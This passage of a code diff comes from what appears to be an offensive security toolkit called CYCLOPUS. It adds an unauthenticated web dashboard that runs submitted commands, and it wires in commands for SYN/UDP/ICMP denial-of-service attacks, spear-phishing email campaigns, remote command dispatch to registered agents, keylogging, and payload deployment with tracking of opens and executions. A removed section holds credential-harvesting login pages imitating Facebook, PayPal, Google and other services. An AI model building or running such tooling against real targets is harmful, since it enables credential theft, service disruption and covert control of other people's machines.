+                    barCtx.textAlign = 'center';
+                    barCtx.fillText(val, x + barW/2, y - 6);
+
+                    barCtx.fillStyle = '#6b5c52';
+                    barCtx.font = '10px Courier New';
+                    barCtx.fillText(barLabels[idx], x + barW/2, h - padding.bottom + 16);
+                });
+
+                barCtx.strokeStyle = '#e8600a';
+                barCtx.lineWidth = 1.5;
+                barCtx.beginPath();
+                barCtx.moveTo(padding.left, padding.top);
+                barCtx.lineTo(padding.left, h - padding.bottom);
+                barCtx.lineTo(w - padding.right, h - padding.bottom);
+                barCtx.stroke();
+            }
+
+            function roundRect(ctx, x, y, w, h, r){
+                if(h < 0){ y += h; h = Math.abs(h); }
+                ctx.beginPath();
+                ctx.moveTo(x + r, y);
+                ctx.lineTo(x + w - r, y);
+                ctx.quadraticCurveTo(x+w, y, x+w, y+r);
+                ctx.lineTo(x+w, y+h);
+                ctx.lineTo(x, y+h);
+                ctx.lineTo(x, y+r);
+                ctx.quadraticCurveTo(x, y, x+r, y);
+                ctx.closePath();
+            }
+
+            const pieCanvas = document.getElementById('pieChart');
+            const pieCtx = pieCanvas.getContext('2d');
+
+            function drawPieChart(){
+                const w = pieCanvas.width;
+                const h = pieCanvas.height;
+                pieCtx.clearRect(0,0,w,h);
+
+                const cx = w/2, cy = h/2;
+                const radius = Math.min(w,h)/2 - 16;
+                const total = pieData.reduce((a,b)=>a+b, 0) || 1;
+
+                let startAngle = -Math.PI/2;
+
+                pieData.forEach((val, idx)=>{
+                    const sliceAngle = (val/total) * Math.PI * 2;
+                    const endAngle = startAngle + sliceAngle;
+
+                    pieCtx.beginPath();
+                    pieCtx.moveTo(cx, cy);
+                    pieCtx.arc(cx, cy, radius, startAngle, endAngle);
+                    pieCtx.closePath();
+                    pieCtx.fillStyle = ORANGE_PALETTE[idx % ORANGE_PALETTE.length];
+                    pieCtx.fill();
+                    pieCtx.strokeStyle = '#fffdfb';
+                    pieCtx.lineWidth = 3;
+                    pieCtx.stroke();
+
+                    const midAngle = startAngle + sliceAngle/2;
+                    const labelX = cx + Math.cos(midAngle) * radius * 0.65;
+                    const labelY = cy + Math.sin(midAngle) * radius * 0.65;
+                    const pct = Math.round((val/total)*100);
+                    if(pct > 4){
+                        pieCtx.fillStyle = '#2b2320';
+                        pieCtx.font = 'bold 11px Courier New';
+                        pieCtx.textAlign = 'center';
+                        pieCtx.fillText(pct + '%', labelX, labelY);
+                    }
+
+                    startAngle = endAngle;
+                });
+
+                pieCtx.beginPath();
+                pieCtx.arc(cx, cy, radius*0.42, 0, Math.PI*2);
+                pieCtx.fillStyle = '#fffdfb';
+                pieCtx.fill();
+
+                pieCtx.fillStyle = '#e8600a';
+                pieCtx.font = 'bold 12px Courier New';
+                pieCtx.textAlign = 'center';
+                pieCtx.fillText('CYCLOPUS', cx, cy - 4);
+                pieCtx.font = '9px Courier New';
+                pieCtx.fillStyle = '#a9948a';
+                pieCtx.fillText('DATA MIX', cx, cy + 10);
+            }
+
+            function renderLegends(){
+                const barLegend = document.getElementById('barLegend');
+                barLegend.innerHTML = '';
+                barLabels.forEach((label, idx)=>{
+                    const item = document.createElement('div');
+                    item.className = 'item';
+                    item.innerHTML = `<span class="swatch" style="background:${ORANGE_PALETTE[idx % ORANGE_PALETTE.length]}"></span>${label}`;
+                    barLegend.appendChild(item);
+                });
+
+                const pieLegend = document.getElementById('pieLegend');
+                pieLegend.innerHTML = '';
+                pieLabels.forEach((label, idx)=>{
+                    const item = document.createElement('div');
+                    item.className = 'item';
+                    item.innerHTML = `<span class="swatch" style="background:${ORANGE_PALETTE[idx % ORANGE_PALETTE.length]}"></span>${label}`;
+                    pieLegend.appendChild(item);
+                });
+            }
+
+            function regenerateChartData(){
+                randomizeData();
+                drawBarChart();
+                drawPieChart();
+            }
+
+            document.getElementById('refreshChartsBtn').addEventListener('click', ()=>{
+                regenerateChartData();
+                printLine('telemetry charts refreshed via button.', 'system');
+            });
+
+            window.addEventListener('load', ()=>{
+                bootSequence();
+                renderLegends();
+                drawBarChart();
+                drawPieChart();
+                inputEl.focus();
+            });
+
+            window.addEventListener('resize', ()=>{
+                drawBarChart();
+                drawPieChart();
+            });
+        </script>
+        </body>
+        </html>
+        '''
+        
+        @app.route('/')
+        def index():
+            return render_template_string(TEMPLATE)
+        
+        @app.route('/api/command', methods=['POST'])
+        def api_command():
+            data = request.json
+            command = data.get('command', '')
+            result = self.handler.execute(command, 'web', 'web_user')
+            socketio.emit('command_result', {
+                'command': command,
+                'output': result.get('output', '')[:2000],
+                'execution_time': result.get('execution_time', 0)
+            })
+            return jsonify(result)
+        
+        @app.route('/api/stats')
+        def api_stats():
+            stats = self.db.get_statistics()
+            return jsonify(stats)
+        
+        @app.route('/api/threats')
+        def api_threats():
+            threats = self.db.get_recent_threats(20)
+            return jsonify({'threats': threats})
+        
+        @app.route('/api/platforms')
+        def api_platforms():
+            platforms = [
+                {'name': 'discord', 'enabled': DISCORD_AVAILABLE},
+                {'name': 'telegram', 'enabled': TELETHON_AVAILABLE},
+                {'name': 'slack', 'enabled': SLACK_AVAILABLE},
+                {'name': 'signal', 'enabled': SIGNAL_AVAILABLE},
+                {'name': 'whatsapp', 'enabled': SELENIUM_AVAILABLE},
+                {'name': 'googlechat', 'enabled': GOOGLE_CHAT_AVAILABLE},
+                {'name': 'imessage', 'enabled': IMESSAGE_AVAILABLE}
+            ]
+            return jsonify({'platforms': platforms})
+        
+        self.app = app
+        self.socketio = socketio
+        return app
+    
+    def start(self):
+        if not WEB_AVAILABLE:
+            print(f"{Colors.WARNING}⚠️ Flask not available. Web dashboard disabled.{Colors.RESET}")
+            return
+        
+        app = self.create_app()
+        if app:
+            port = self.config.get('web.port', 5000)
+            host = self.config.get('web.host', '0.0.0.0')
+            thread = threading.Thread(target=lambda: self.socketio.run(app, host=host, port=port, debug=False), daemon=True)
             thread.start()
             self.running = True
-            return True
-        except:
-            return False
-    
-    def stop(self):
-        if self.server:
-            self.server.shutdown()
-            self.server.server_close()
-            self.running = False
-
-# =====================
-# SOCIAL ENGINEERING TOOLS
-# =====================
-class SocialEngineeringTools:
-    def __init__(self, db: DatabaseManager):
-        self.db = db
-        self.phishing_server = PhishingServer(db)
-        self.active_links = {}
-    
-    def generate_phishing_link(self, platform: str) -> Dict:
-        link_id = str(uuid.uuid4())[:8]
-        
-        templates = {
-            'facebook': self._get_template("Facebook", "#1877f2"),
-            'instagram': self._get_template("Instagram", "#0095f6"),
-            'twitter': self._get_template("X / Twitter", "#1d9bf0"),
-            'gmail': self._get_template("Gmail", "#1a73e8"),
-            'linkedin': self._get_template("LinkedIn", "#0a66c2"),
-            'microsoft': self._get_template("Microsoft", "#0078d4"),
-            'google': self._get_template("Google", "#4285f4"),
-            'apple': self._get_template("Apple", "#0071e3"),
-            'paypal': self._get_template("PayPal", "#0070ba"),
-            'amazon': self._get_template("Amazon", "#ff9900"),
-            'netflix': self._get_template("NETFLIX", "#e50914"),
-            'spotify': self._get_template("Spotify", "#1ed760"),
-            'whatsapp': self._get_template("WhatsApp", "#25d366"),
-            'telegram': self._get_template("Telegram", "#2aabee"),
-            'discord': self._get_template("Discord", "#5865f2"),
-        }
-        
-        html = templates.get(platform, self._custom_template())
-        
-        link = PhishingLink(
-            id=link_id,
-            platform=platform,
-            phishing_url=f"http://localhost:8080",
-            template=platform,
-            created_at=datetime.datetime.now().isoformat()
-        )
-        
-        self.db.save_phishing_link(link)
-        self.active_links[link_id] = {'platform': platform, 'html': html}
-        
-        return {'success': True, 'link_id': link_id, 'platform': platform}
-    
-    def start_server(self, link_id: str, port: int = 8080) -> bool:
-        if link_id not in self.active_links:
-            return False
-        link_data = self.active_links[link_id]
-        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
-    
-    def stop_server(self):
-        self.phishing_server.stop()
-    
-    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
-        return self.db.get_captured_credentials(link_id)
-    
-    def _get_template(self, display_name: str, color: str) -> str:
-        return f"""<!DOCTYPE html>
-<html><head><title>{display_name}</title>
-<style>
-body{{font-family:Arial;background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
-.login-box{{background:#1a1a1a;border:1px solid #ff7a1a;border-radius:8px;padding:20px;width:400px;box-shadow:0 0 30px rgba(255,122,26,0.2)}}
-.logo{{color:{color};font-size:32px;text-align:center;margin-bottom:20px}}
-input{{width:100%;padding:14px;margin:10px 0;background:#0a0a0a;border:1px solid #333;border-radius:6px;box-sizing:border-box;color:#fff}}
-input:focus{{outline:none;border-color:#ff7a1a}}
-button{{width:100%;padding:14px;background:{color};color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}}
-.warning{{margin-top:20px;padding:10px;background:rgba(255,122,26,0.1);color:#ffb066;text-align:center;border-radius:4px;font-size:12px}}
-</style>
-</head>
-<body>
-<div class="login-box"><div class="logo">{display_name}</div>
-<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
-<input type="password" name="password" placeholder="Password" required>
-<button type="submit">Log In</button></form>
-<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
-</div>
-</body>
-</html>"""
-    
-    def _custom_template(self) -> str:
-        return """<!DOCTYPE html>
-<html><head><title>Secure Login</title>
-<style>
-body{font-family:Arial;background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
-.login-box{background:#1a1a1a;border:1px solid #ff7a1a;border-radius:8px;padding:40px;width:400px;box-shadow:0 0 30px rgba(255,122,26,0.2)}
-.logo{text-align:center;margin-bottom:30px;color:#ff7a1a;font-size:28px;font-weight:bold}
-input{width:100%;padding:14px;margin:10px 0;background:#0a0a0a;border:1px solid #333;border-radius:6px;color:#fff;box-sizing:border-box}
-input:focus{outline:none;border-color:#ff7a1a}
-button{width:100%;padding:14px;background:#ff7a1a;color:white;border:none;border-radius:6px;cursor:pointer;font-weight:bold;font-size:16px}
-.warning{margin-top:20px;padding:10px;background:rgba(255,122,26,0.1);border-radius:6px;color:#ffb066;text-align:center;font-size:12px}
-</style>
-</head>
-<body>
-<div class="login-box"><div class="logo">🐙 CYCLOPUS</div>
-<form method="POST"><input type="text" name="username" placeholder="Username" required>
-<input type="password" name="password" placeholder="Password" required>
-<button type="submit">Secure Login</button></form>
-<div class="warning">🔒 Secure connection - Do not enter real credentials</div>
-</div>
-</body>
-</html>"""
+            print(f"{Colors.SUCCESS}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")
 
 # =====================
 # COMMAND HANDLER
 # =====================
 class CommandHandler:
     def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
-                 traffic_gen: TrafficGeneratorEngine = None,
-                 dos_engine = None,
-                 keylogger: KeyloggerEngine = None,
-                 deployment_engine = None,
+                 traffic_gen: TrafficGeneratorEngine = None, nikto: NiktoScanner = None,
+                 dos_engine: DOSEngine = None, spear_phishing: SpearPhishingEngine = None,
+                 agent_engine: AgentEngine = None, network_monitor: NetworkMonitor = None,
+                 keylogger: KeyloggerEngine = None, deployment_engine: DeploymentEngine = None,
+                 domain_hosting: DomainHostingEngine = None,
                  cracking_engine: CrackingEngine = None,
                  arp_spoofing: ARPSpoofingEngine = None,
                  mac_manager: MACManager = None,
                  nat_info: NATInfoEngine = None,
-                 transformer: TransformerEngine = None,
                  email_composer: EmailComposerEngine = None,
                  pdf_report: PDFReportGenerator = None,
-                 docker_scanner: DockerScanner = None,
-                 social_tools: SocialEngineeringTools = None,
-                 network_monitor = None):
+                 docker_scanner: DockerScanner = None):
         self.db = db
         self.ssh = ssh_manager
         self.traffic = traffic_gen
+        self.nikto = nikto
         self.dos = dos_engine
+        self.spear = spear_phishing
+        self.agent = agent_engine
+        self.network_monitor = network_monitor
         self.keylogger = keylogger
         self.deployment = deployment_engine
+        self.domain_hosting = domain_hosting
         self.cracking = cracking_engine
         self.arp_spoofing = arp_spoofing
         self.mac_manager = mac_manager
         self.nat_info = nat_info
-        self.transformer = transformer
         self.email_composer = email_composer
         self.pdf_report = pdf_report
         self.docker_scanner = docker_scanner
-        self.social = social_tools or SocialEngineeringTools(db)
-        self.network_monitor = network_monitor
+        self.social = SocialEngineeringTools(db)
         self.tools = NetworkTools()
         self.commands = self._build_commands()
     
@@ -4947,6 +6146,7 @@ class CommandHandler:
             'ping': self._ping,
             'ping6': self._ping6,
             'ping_sweep': self._ping_sweep,
+            'fping': self._fping,
             
             # Nmap Commands
             'nmap': self._nmap,
@@ -4968,6 +6168,7 @@ class CommandHandler:
             'curl_get': self._curl_get,
             'curl_post': self._curl_post,
             'curl_head': self._curl_head,
+            'curl_options': self._curl_options,
             
             # Netcat Commands
             'nc': self._netcat,
@@ -5004,6 +6205,11 @@ class CommandHandler:
             'traffic_stop': self._traffic_stop,
             'traffic_status': self._traffic_status,
             
+            # Nikto Commands
+            'nikto': self._nikto,
+            'nikto_full': self._nikto_full,
+            'nikto_ssl': self._nikto_ssl,
+            
             # DOS Attacks
             'dos_syn': self._dos_syn,
             'dos_udp': self._dos_udp,
@@ -5011,6 +6217,23 @@ class CommandHandler:
             'dos_icmp': self._dos_icmp,
             'dos_stop': self._dos_stop,
             'dos_status': self._dos_status,
+            
+            # Spear Phishing
+            'spear_create': self._spear_create,
+            'spear_send': self._spear_send,
+            'spear_list': self._spear_list,
+            
+            # Agent Commands
+            'agent_register': self._agent_register,
+            'agent_command': self._agent_command,
+            'agent_list': self._agent_list,
+            'agent_status': self._agent_status,
+            
+            # Network Monitor
+            'netmon_start': self._netmon_start,
+            'netmon_stop': self._netmon_stop,
+            'netmon_status': self._netmon_status,
+            'netmon_packets': self._netmon_packets,
             
             # Keylogger
             'keylogger_start': self._keylogger_start,
@@ -5026,6 +6249,15 @@ class CommandHandler:
             'deploy_link': self._deploy_link,
             'deploy_executable': self._deploy_executable,
             'deploy_list': self._deploy_list,
+            'deploy_track': self._deploy_track,
+            
+            # Domain Hosting
+            'ip_to_domain': self._ip_to_domain,
+            'domain_to_ip': self._domain_to_ip,
+            'host_domain': self._host_domain,
+            'host_website': self._host_website,
+            'list_domains': self._list_domains,
+            'domain_info': self._domain_info,
             
             # Social Engineering
             'phish_facebook': lambda _: self._phish('facebook'),
@@ -5068,29 +6300,22 @@ class CommandHandler:
             'nat_public': self._nat_public,
             'nat_private': self._nat_private,
             
-            # Transformer Commands
-            'transform': self._transform,
-            
             # Docker Commands
             'docker_scan': self._docker_scan,
             'docker_info': self._docker_info,
             'docker_ps': self._docker_ps,
             'docker_images': self._docker_images,
+            'docker_bench': self._docker_bench,
             
             # Email Commands
             'email_compose': self._email_compose,
             'email_send': self._email_send,
             'email_list': self._email_list,
+            'email_delete': self._email_delete,
             
             # PDF Report Commands
             'report_generate': self._report_generate,
             'report_list': self._report_list,
-            
-            # Network Monitor
-            'netmon_start': self._netmon_start,
-            'netmon_stop': self._netmon_stop,
-            'netmon_status': self._netmon_status,
-            'netmon_packets': self._netmon_packets,
             
             # Scan Commands
             'scan': self._scan,
@@ -5106,18 +6331,11 @@ class CommandHandler:
             'ip_info': self._ip_info,
             'analyze_ip': self._analyze_ip,
             
-            # Animation Commands
-            'anim_spinner': self._anim_spinner,
-            'anim_matrix': self._anim_matrix,
-            'anim_pulse': self._anim_pulse,
-            'anim_wave': self._anim_wave,
-            'anim_glitch': self._anim_glitch,
-            'anim_octopus': self._anim_octopus,
-            
             # System Commands
             'status': self._status,
             'history': self._history,
             'system': self._system,
+            'threats': self._threats,
             'report': self._report,
             'clear': self._clear,
             
@@ -5135,17 +6353,6 @@ class CommandHandler:
         cmd_name = parts[0].lower()
         args = parts[1:]
         
-        # Try transformer for natural language
-        if self.transformer:
-            processed = self.transformer.process_input(command)
-            if processed['confidence'] > 0.7 and processed['command'] != 'unknown':
-                cmd_name = processed['command']
-                for key, value in processed.get('params', {}).items():
-                    if key == 'ip' and value not in args:
-                        args = [value] + args
-                    elif key == 'port' and str(value) not in args:
-                        args.append(str(value))
-        
         if cmd_name in self.commands:
             try:
                 result = self.commands[cmd_name](args)
@@ -5161,41 +6368,6 @@ class CommandHandler:
                            str(result.get('output', ''))[:5000], execution_time)
         
         return result
-    
-    # ==================== Animation Commands ====================
-    def _anim_spinner(self, args: List[str]) -> Dict:
-        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
-        message = ' '.join(args[1:]) if len(args) > 1 else "Processing"
-        TerminalAnimation.spinner(duration, message)
-        return {'success': True, 'output': f"🎬 Spinner animation displayed for {duration}s"}
-    
-    def _anim_matrix(self, args: List[str]) -> Dict:
-        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
-        TerminalAnimation.matrix_rain(duration)
-        return {'success': True, 'output': f"🌧️ Matrix rain animation displayed for {duration}s"}
-    
-    def _anim_pulse(self, args: List[str]) -> Dict:
-        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
-        text = ' '.join(args[1:]) if len(args) > 1 else "🐙 CYCLOPUS"
-        TerminalAnimation.pulse_animation(text, duration)
-        return {'success': True, 'output': f"💓 Pulse animation displayed for {duration}s"}
-    
-    def _anim_wave(self, args: List[str]) -> Dict:
-        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
-        text = ' '.join(args[1:]) if len(args) > 1 else "🌊 CYCLOPUS"
-        TerminalAnimation.wave_animation(text, duration)
-        return {'success': True, 'output': f"🌊 Wave animation displayed for {duration}s"}
-    
-    def _anim_glitch(self, args: List[str]) -> Dict:
-        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 1.0
-        text = ' '.join(args[1:]) if len(args) > 1 else "🐙 GLITCH"
-        TerminalAnimation.glitch_effect(text, duration)
-        return {'success': True, 'output': f"⚡ Glitch animation displayed for {duration}s"}
-    
-    def _anim_octopus(self, args: List[str]) -> Dict:
-        duration = float(args[0]) if args and args[0].replace('.', '').isdigit() else 2.0
-        TerminalAnimation.octopus_animation(duration)
-        return {'success': True, 'output': f"🐙 Octopus animation displayed for {duration}s"}
     
     # ==================== Ping Commands ====================
     def _ping(self, args: List[str]) -> Dict:
@@ -5220,11 +6392,19 @@ class CommandHandler:
         result = self._generic(f'nmap -sn {network}')
         return result
     
+    def _fping(self, args: List[str]) -> Dict:
+        if not args:
+            return {'success': False, 'output': 'Usage: fping <targets...>'}
+        targets = ' '.join(args)
+        result = self._generic(f'fping {targets}')
+        return result
+    
     # ==================== Nmap Commands ====================
     def _nmap(self, args: List[str]) -> Dict:
         if not args:
             return {'success': False, 'output': 'Usage: nmap <target> [options]'}
         target = args[0]
+        options = ' '.join(args[1:]) if len(args) > 1 else ''
         result = self.tools.nmap(target)
         return {'success': result.success, 'output': result.output}
     
@@ -5329,6 +6509,13 @@ class CommandHandler:
             return {'success': False, 'output': 'Usage: curl_head <url>'}
         url = args[0]
         result = self.tools.curl(url, 'HEAD')
+        return {'success': result.success, 'output': result.output}
+    
+    def _curl_options(self, args: List[str]) -> Dict:
+        if not args:
+            return {'success': False, 'output': 'Usage: curl_options <url>'}
+        url = args[0]
+        result = self.tools.curl(url, 'OPTIONS')
         return {'success': result.success, 'output': result.output}
     
     # ==================== Netcat Commands ====================
@@ -5518,6 +6705,45 @@ class CommandHandler:
             output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
         return {'success': True, 'output': output}
     
+    # ==================== Nikto Commands ====================
+    def _nikto(self, args: List[str]) -> Dict:
+        if not self.nikto:
+            return {'success': False, 'output': 'Nikto scanner not initialized'}
+        if not args:
+            return {'success': False, 'output': 'Usage: nikto <target>'}
+        target = args[0]
+        result = self.nikto.scan(target)
+        if result['success']:
+            output = f"🕷️ Nikto scan of {target} completed in {result['scan_time']:.1f}s\n"
+            output += f"Vulnerabilities found: {len(result['vulnerabilities'])}\n"
+            for v in result['vulnerabilities'][:5]:
+                desc = v.get('description', '')[:100]
+                output += f"  • {desc}\n"
+            return {'success': True, 'output': output}
+        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
+    
+    def _nikto_full(self, args: List[str]) -> Dict:
+        if not self.nikto:
+            return {'success': False, 'output': 'Nikto scanner not initialized'}
+        if not args:
+            return {'success': False, 'output': 'Usage: nikto_full <target>'}
+        target = args[0]
+        result = self.nikto.scan(target, {'tuning': '123456789', 'ssl': True})
+        if result['success']:
+            return {'success': True, 'output': f"Full Nikto scan completed: {len(result['vulnerabilities'])} vulnerabilities found"}
+        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
+    
+    def _nikto_ssl(self, args: List[str]) -> Dict:
+        if not self.nikto:
+            return {'success': False, 'output': 'Nikto scanner not initialized'}
+        if not args:
+            return {'success': False, 'output': 'Usage: nikto_ssl <target>'}
+        target = args[0]
+        result = self.nikto.scan(target, {'ssl': True})
+        if result['success']:
+            return {'success': True, 'output': f"SSL/TLS scan completed: {len(result['vulnerabilities'])} findings"}
+        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
+    
     # ==================== DOS Attacks ====================
     def _dos_syn(self, args: List[str]) -> Dict:
         if not self.dos:
@@ -5567,7 +6793,7 @@ class CommandHandler:
             return {'success': False, 'output': 'DOS engine not initialized'}
         attack_id = args[0] if args else None
         if self.dos.stop(attack_id):
-            return {'success': True, 'output': 'DOS attack stopped'}
+            return {'success': True, 'output': 'DOS attack stopped' + (f' ({attack_id})' if attack_id else '')}
         return {'success': False, 'output': 'Failed to stop DOS attack'}
     
     def _dos_status(self, args: List[str]) -> Dict:
@@ -5579,6 +6805,132 @@ class CommandHandler:
         output = "Active DOS Attacks:\n"
         for a in active:
             output += f"  • {a['type']} attack on {a['target']}\n"
+        return {'success': True, 'output': output}
+    
+    # ==================== Spear Phishing ====================
+    def _spear_create(self, args: List[str]) -> Dict:
+        if not self.spear:
+            return {'success': False, 'output': 'Spear phishing engine not initialized'}
+        if len(args) < 5:
+            return {'success': False, 'output': 'Usage: spear_create <name> <subject> <from> <template_file> <targets_file>'}
+        name = args[0]
+        subject = args[1]
+        from_email = args[2]
+        template_file = args[3]
+        targets_file = args[4]
+        
+        try:
+            with open(template_file, 'r') as f:
+                template = f.read()
+            with open(targets_file, 'r') as f:
+                targets = json.load(f)
+            
+            campaign = self.spear.create_campaign(name, template, subject, from_email, targets)
+            return {'success': True, 'output': f"Campaign created: {campaign.id} - {campaign.name}"}
+        except Exception as e:
+            return {'success': False, 'output': f"Failed to create campaign: {e}"}
+    
+    def _spear_send(self, args: List[str]) -> Dict:
+        if not self.spear:
+            return {'success': False, 'output': 'Spear phishing engine not initialized'}
+        if not args:
+            return {'success': False, 'output': 'Usage: spear_send <campaign_id>'}
+        campaign_id = args[0]
+        result = self.spear.send_campaign(campaign_id)
+        return {'success': result.get('success', False), 'output': f"Sent {result.get('sent_count', 0)} emails"}
+    
+    def _spear_list(self, args: List[str]) -> Dict:
+        if not self.spear:
+            return {'success': False, 'output': 'Spear phishing engine not initialized'}
+        campaigns = self.spear.get_campaigns()
+        if not campaigns:
+            return {'success': True, 'output': 'No campaigns found'}
+        output = "Spear Phishing Campaigns:\n"
+        for c in campaigns:
+            output += f"  • {c['id']} - {c['name']} ({c['status']}) - Sent: {c['sent_count']}\n"
+        return {'success': True, 'output': output}
+    
+    # ==================== Agent Commands ====================
+    def _agent_register(self, args: List[str]) -> Dict:
+        if not self.agent:
+            return {'success': False, 'output': 'Agent engine not initialized'}
+        if len(args) < 2:
+            return {'success': False, 'output': 'Usage: agent_register <name> <ip>'}
+        name = args[0]
+        ip = args[1]
+        result = self.agent.register_agent(name, ip)
+        return {'success': result.get('success', False), 'output': result.get('message', '')}
+    
+    def _agent_command(self, args: List[str]) -> Dict:
+        if not self.agent:
+            return {'success': False, 'output': 'Agent engine not initialized'}
+        if len(args) < 2:
+            return {'success': False, 'output': 'Usage: agent_command <agent_id> <command>'}
+        agent_id = args[0]
+        command = ' '.join(args[1:])
+        success = self.agent.send_command(agent_id, command)
+        return {'success': success, 'output': f"Command sent to agent {agent_id}" if success else "Failed to send command"}
+    
+    def _agent_list(self, args: List[str]) -> Dict:
+        if not self.agent:
+            return {'success': False, 'output': 'Agent engine not initialized'}
+        agents = self.agent.get_agents()
+        if not agents:
+            return {'success': True, 'output': 'No agents registered'}
+        output = "Registered Agents:\n"
+        for a in agents:
+            status = "🟢" if a.get('status') == 'online' else "🔴"
+            output += f"  {status} {a['id']} - {a['name']} ({a.get('ip_address', 'unknown')})\n"
+            output += f"     Last heartbeat: {a.get('last_heartbeat', 'Never')}\n"
+        return {'success': True, 'output': output}
+    
+    def _agent_status(self, args: List[str]) -> Dict:
+        if not self.agent:
+            return {'success': False, 'output': 'Agent engine not initialized'}
+        if not args:
+            return {'success': False, 'output': 'Usage: agent_status <agent_id>'}
+        agent = self.agent.get_agent(args[0])
+        if not agent:
+            return {'success': False, 'output': f"Agent {args[0]} not found"}
+        return {'success': True, 'output': json.dumps(agent, indent=2)}
+    
+    # ==================== Network Monitor ====================
+    def _netmon_start(self, args: List[str]) -> Dict:
+        if not self.network_monitor:
+            return {'success': False, 'output': 'Network monitor not initialized'}
+        self.network_monitor.start()
+        return {'success': True, 'output': 'Network monitor started'}
+    
+    def _netmon_stop(self, args: List[str]) -> Dict:
+        if not self.network_monitor:
+            return {'success': False, 'output': 'Network monitor not initialized'}
+        self.network_monitor.stop()
+        return {'success': True, 'output': 'Network monitor stopped'}
+    
+    def _netmon_status(self, args: List[str]) -> Dict:
+        if not self.network_monitor:
+            return {'success': False, 'output': 'Network monitor not initialized'}
+        stats = self.network_monitor.get_statistics()
+        output = f"Network Monitor Status:\n"
+        output += f"  Running: {self.network_monitor.running}\n"
+        output += f"  Interface: {self.network_monitor.interface}\n"
+        output += f"  Promiscuous: {self.network_monitor.promiscuous}\n"
+        output += f"  Packets captured: {self.network_monitor.packet_count}\n"
+        output += f"\nTraffic Statistics:\n"
+        for proto, count in stats.get('protocols', {}).items():
+            output += f"  {proto}: {count}\n"
+        return {'success': True, 'output': output}
+    
+    def _netmon_packets(self, args: List[str]) -> Dict:
+        if not self.network_monitor:
+            return {'success': False, 'output': 'Network monitor not initialized'}
+        limit = int(args[0]) if args else 20
+        packets = self.network_monitor.get_packets(limit)
+        if not packets:
+            return {'success': True, 'output': 'No packets captured'}
+        output = f"Recent Packets ({len(packets)}):\n"
+        for p in packets:
+            output += f"  {p.get('timestamp', '')[:19]} {p.get('source_ip', '')} -> {p.get('dest_ip', '')} ({p.get('protocol', 'unknown')})\n"
         return {'success': True, 'output': output}
     
     # ==================== Keylogger ====================
@@ -5708,7 +7060,114 @@ class CommandHandler:
             status = "📄" if d['delivered'] else "⏳"
             output += f"  {status} {d['id']} - {d['name']} ({d['type']})\n"
             output += f"     Target: {d['target']}\n"
+            output += f"     Opened: {d['opened']}, Executed: {d['executed']}\n"
         return {'success': True, 'output': output}
+    
+    def _deploy_track(self, args: List[str]) -> Dict:
+        if not self.deployment:
+            return {'success': False, 'output': 'Deployment engine not initialized'}
+        if not args:
+            return {'success': False, 'output': 'Usage: deploy_track <deployment_id>'}
+        deployment_id = args[0]
+        self.deployment.track_opened(deployment_id)
+        return {'success': True, 'output': f"Tracked open for deployment {deployment_id}"}
+    
+    # ==================== Domain Hosting Commands ====================
+    def _ip_to_domain(self, args: List[str]) -> Dict:
+        if not self.domain_hosting:
+            return {'success': False, 'output': 'Domain hosting engine not initialized'}
+        if not args:
+            return {'success': False, 'output': 'Usage: ip_to_domain <ip>'}
+        ip = args[0]
+        try:
+            domain = self.domain_hosting.translate_ip_to_domain(ip)
+            if domain:
+                return {'success': True, 'output': f"Domain for IP {ip}: {domain}"}
+            return {'success': False, 'output': f"No domain found for IP {ip}"}
+        except Exception as e:
+            return {'success': False, 'output': f"Error: {e}"}
+    
+    def _domain_to_ip(self, args: List[str]) -> Dict:
+        if not self.domain_hosting:
+            return {'success': False, 'output': 'Domain hosting engine not initialized'}
+        if not args:
+            return {'success': False, 'output': 'Usage: domain_to_ip <domain>'}
+        domain = args[0]
+        try:
+            ip = self.domain_hosting.translate_domain_to_ip(domain)
+            if ip:
+                return {'success': True, 'output': f"IP for domain {domain}: {ip}"}
+            return {'success': False, 'output': f"No IP found for domain {domain}"}
+        except Exception as e:
+            return {'success': False, 'output': f"Error: {e}"}
+    
+    def _host_domain(self, args: List[str]) -> Dict:
+        if not self.domain_hosting:
+            return {'success': False, 'output': 'Domain hosting engine not initialized'}
+        if len(args) < 2:
+            return {'success': False, 'output': 'Usage: host_domain <ip> <domain> [port]'}
+        ip = args[0]
+        domain = args[1]
+        port = int(args[2]) if len(args) > 2 else 8080
+        
+        try:
+            domain_host = self.domain_hosting.host_domain(ip, domain, port)
+            if domain_host:
+                return {
+                    'success': True,
+                    'output': f"Domain {domain} hosted on IP {ip}:{port}\nID: {domain_host.id}\nPath: {domain_host.hosting_path}"
+                }
+            return {'success': False, 'output': f"Failed to host domain {domain}"}
+        except Exception as e:
+            return {'success': False, 'output': f"Error: {e}"}
+    
+    def _host_website(self, args: List[str]) -> Dict:
+        if not self.domain_hosting:
+            return {'success': False, 'output': 'Domain hosting engine not initialized'}
+        if len(args) < 2:
+            return {'success': False, 'output': 'Usage: host_website <domain> <html_file>'}
+        domain = args[0]
+        html_file = args[1]
+        
+        try:
+            with open(html_file, 'r') as f:
+                html_content = f.read()
+            success = self.domain_hosting.host_website(domain, html_content)
+            if success:
+                return {'success': True, 'output': f"Website hosted on http://{domain}"}
+            return {'success': False, 'output': f"Failed to host website on {domain}"}
+        except Exception as e:
+            return {'success': False, 'output': f"Error: {e}"}
+    
+    def _list_domains(self, args: List[str]) -> Dict:
+        if not self.domain_hosting:
+            return {'success': False, 'output': 'Domain hosting engine not initialized'}
+        try:
+            domains = self.domain_hosting.list_hosted_domains()
+            if not domains:
